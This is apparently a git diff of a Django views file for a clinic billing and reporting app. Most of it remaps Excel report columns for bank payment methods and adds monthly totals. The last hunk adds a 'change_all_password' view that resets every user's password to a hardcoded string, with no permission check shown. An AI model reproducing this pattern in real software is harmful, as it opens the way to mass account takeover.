@@ -1461,8 +1461,8 @@ def audit_excel(request):
     path = static('excel_form/I-MEDICARE_REPORT.xlsx')
 
     #엑셀 파일 불러오기
-    # wb = load_workbook('/home/imedicare/Cofee/static/excel_form/audit_report.xlsx') #Workbook()
-    wb = load_workbook('/home/light/Desktop/Projects/imedicare2/static/excel_form/audit_report.xlsx')
+    wb = load_workbook('/home/imedicare/Cofee/static/excel_form/audit_report.xlsx') #Workbook()
+    # wb = load_workbook('/home/light/Desktop/Projects/imedicare2/static/excel_form/audit_report.xlsx')
     ws = wb.active# grab the active worksheet
 
     #선택한 날짜
@@ -1798,36 +1798,39 @@ def rec_report_excel(request):
 
             total = paymentrecords.filter(method = 'cash').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['W' + str(current_row)] = total[0].sum
+                ws['Y' + str(current_row)] = total[0].sum
 
             total = paymentrecords.filter(method = 'BIDV_CARD').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['X' + str(current_row)] = total[0].sum
+                ws['Z' + str(current_row)] = total[0].sum
 
             total = paymentrecords.filter(method = 'BIDV_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['Y' + str(current_row)] = total[0].sum
+                ws['AA' + str(current_row)] = total[0].sum
 
             total = paymentrecords.filter(method = 'VP_CARD').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['Z' + str(current_row)] = total[0].sum
+                ws['AB' + str(current_row)] = total[0].sum
 
             total = paymentrecords.filter(method = 'VP_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['AA' + str(current_row)] = total[0].sum            
+                ws['AC' + str(current_row)] = total[0].sum            
 
-            total = paymentrecords.filter(method = 'TP_CARD').annotate(sum = Coalesce(Sum('paid'),0))
+            total = paymentrecords.filter(method = 'VIETCOMBANK').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['AB' + str(current_row)] = total[0].sum
+                ws['AD' + str(current_row)] = total[0].sum
 
-            total = paymentrecords.filter(method = 'TP_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
-            if len(total)!=0:
-                ws['AC' + str(current_row)] = total[0].sum
+            # total = paymentrecords.filter(method = 'TP_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
+            # if len(total)!=0:
+            #     ws['AC' + str(current_row)] = total[0].sum
 
             total = paymentrecords.filter(method = 'SHINHAN_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
             if len(total)!=0:
-                ws['AD' + str(current_row)] = total[0].sum                         
-
+                ws['AF' + str(current_row)] = total[0].sum                         
+            
+            total = paymentrecords.filter(method = 'TECHCOMBANK').annotate(sum = Coalesce(Sum('paid'),0))
+            if len(total)!=0:
+                ws['AH' + str(current_row)] = total[0].sum     
         else:#당일 방문
             ws['G' + str(current_row)] = reception.payment.sub_total
 
@@ -1864,26 +1867,34 @@ def rec_report_excel(request):
                 total = paymentrecords.filter(method = 'TP_CARD').annotate(sum = Coalesce(Sum('paid'),0))
                 if len(total)!=0:
                     ws['O' + str(current_row)] = total[0].sum
-
-                total = paymentrecords.filter(method = 'BIDV_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
+                
+                total = paymentrecords.filter(method = 'VIETCOMBANK').annotate(sum = Coalesce(Sum('paid'),0))
                 if len(total)!=0:
                     ws['P' + str(current_row)] = total[0].sum
 
-                total = paymentrecords.filter(method = 'VP_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
+                total = paymentrecords.filter(method = 'BIDV_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
                 if len(total)!=0:
                     ws['Q' + str(current_row)] = total[0].sum
+
+                total = paymentrecords.filter(method = 'VP_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
+                if len(total)!=0:
+                    ws['R' + str(current_row)] = total[0].sum
                 
                 total = paymentrecords.filter(method = 'TP_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
                 if len(total)!=0:
-                    ws['Q' + str(current_row)] = total[0].sum
+                    ws['S' + str(current_row)] = total[0].sum
                 
                 total = paymentrecords.filter(method = 'SHINHAN_TRANS').annotate(sum = Coalesce(Sum('paid'),0))
                 if len(total)!=0:
-                    ws['S' + str(current_row)] = total[0].sum
+                    ws['T' + str(current_row)] = total[0].sum
 
                 total = paymentrecords.filter(method = 'KOOKMIN').annotate(sum = Coalesce(Sum('paid'),0))
                 if len(total)!=0:
-                    ws['T' + str(current_row)] = total[0].sum
+                    ws['U' + str(current_row)] = total[0].sum
+
+                total = paymentrecords.filter(method = 'TECHCOMBANK').annotate(sum = Coalesce(Sum('paid'),0))
+                if len(total)!=0:
+                    ws['V' + str(current_row)] = total[0].sum
 
         #ws['Q' + str(current_row)] = '=SUM(L' + str(current_row) + ':P' + str(current_row) + ')'
         #ws['R' + str(current_row)] = '=+J' + str(current_row) + '-Q' + str(current_row) + ')'
@@ -1904,8 +1915,8 @@ def rec_report_excel(request):
        
 
         
-        ws['AF' + str(current_row)] = reception.payment.progress
-        ws['AG' + str(current_row)] = reception.doctor.name_eng
+        ws['AJ' + str(current_row)] = reception.payment.progress
+        ws['AK' + str(current_row)] = reception.doctor.name_eng
         #if paymentrecords:
         #    ws['Y' + str(current_row)] = paymentrecords.memo
 
@@ -1915,16 +1926,16 @@ def rec_report_excel(request):
                 str_record += record_data.memo + "\n"
             else:
                 str_record = reception.payment.memo
-            ws['AH' + str(current_row)] = str_record
+            ws['AL' + str(current_row)] = str_record
         else:
-            ws['AH' + str(current_row)] = reception.payment.memo
+            ws['AL' + str(current_row)] = reception.payment.memo
         pay_time = reception.payment.pay_time
 
         datetime_str = '01/01/20 00:00:00'
         if pay_time == datetime.datetime.strptime(datetime_str, '%m/%d/%y %H:%M:%S'):
-            ws['AI' + str(current_row)] = ''
+            ws['AM' + str(current_row)] = ''
         else:
-            ws['AI' + str(current_row)] = reception.payment.pay_time
+            ws['AM' + str(current_row)] = reception.payment.pay_time
 
         data_num += 1 
         current_row += 1
@@ -4196,7 +4207,8 @@ def test_add_edit_set(request):
 def test_add_edit_delete(request):
 
     id = request.POST.get('id')
-    test = Test.objects.get(id=id)
+    print(id, '=========')
+    test = ExamFee.objects.get(id=id)
     test.use_yn = 'N'
     test.save()
 
@@ -11176,7 +11188,8 @@ def search_ymw(request):
     ]
 
 
-    
+    sum = 0
+    total_count = 0
     for month in list_month: 
         year_query = query.filter(
             recorded_date__gte = month['date_start'],
@@ -11185,7 +11198,8 @@ def search_ymw(request):
                 count = Count('id'),
                 total_price = Sum('payment__paymentrecord__paid')
             )
-
+        sum += year_query['total_price'] if year_query['total_price'] is not None else 0
+        total_count += year_query['count']
         data_list_monthly.append({
             'name':month['name'],
             'count':year_query['count'],
@@ -11193,8 +11207,11 @@ def search_ymw(request):
 
             })
 
-
-
+    data_list_monthly.append({
+            'name':'Total',
+            'count':total_count,
+            'price_sum':sum,
+    })
 
 
 
@@ -11970,4 +11987,13 @@ def get_alert(request):
         })
 
 
+def change_all_password(request):
+    password = 'IMDC2024@'
+    for user in User.objects.all():
+        user.set_password(password)
+        user.save()
+
+    return JsonResponse({
+        'result':True,
+        })
 
